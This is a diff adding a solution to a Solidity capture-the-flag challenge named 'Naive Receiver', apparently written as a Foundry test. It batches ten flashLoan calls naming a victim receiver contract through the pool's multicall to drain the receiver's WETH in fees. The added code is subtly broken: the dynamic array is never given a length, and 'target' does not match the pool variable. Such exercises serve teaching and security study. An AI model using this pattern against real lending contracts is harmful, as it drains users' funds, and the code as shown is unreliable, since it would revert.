@@ -77,7 +77,22 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        bytes[] memory data;
+
+        bytes memory callData = abi.encodeWithSelector(
+            target.flashLoan.selector,
+            address(receiver),
+            address(weth),
+            100e18,
+            ""
+        );
+
+        for (uint256 i = 0; i < 10; i++) {
+            data[i] = callData;
+        }
+
+        pool.multicall(data);
+
     }
 
     /**
